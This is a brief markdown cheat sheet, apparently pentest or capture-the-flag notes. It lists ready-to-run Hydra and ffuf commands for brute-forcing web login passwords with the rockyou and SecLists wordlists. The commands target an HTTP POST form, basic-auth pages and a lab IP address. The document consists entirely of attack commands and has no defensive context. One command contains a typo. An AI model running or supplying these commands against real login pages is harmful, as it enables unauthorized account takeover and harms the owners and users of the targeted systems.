## Hydra Bruteforce Password
```
hydra -l USER-P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/api/login:username=^USER^&password=^PASS^:response"
```
### BASIC AUTH
```
hydra -l USER -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt "https-get://TARGET.com/client/:A=BASIC:F=401"
```

```
hydra -l USER -P /usr/share/wordlists/rockyou.txt 10.10.121.156 http-post-form "/login.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR" -t 64 -V
```


## FFUF Bruteforce Password
```
ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fs 480
```



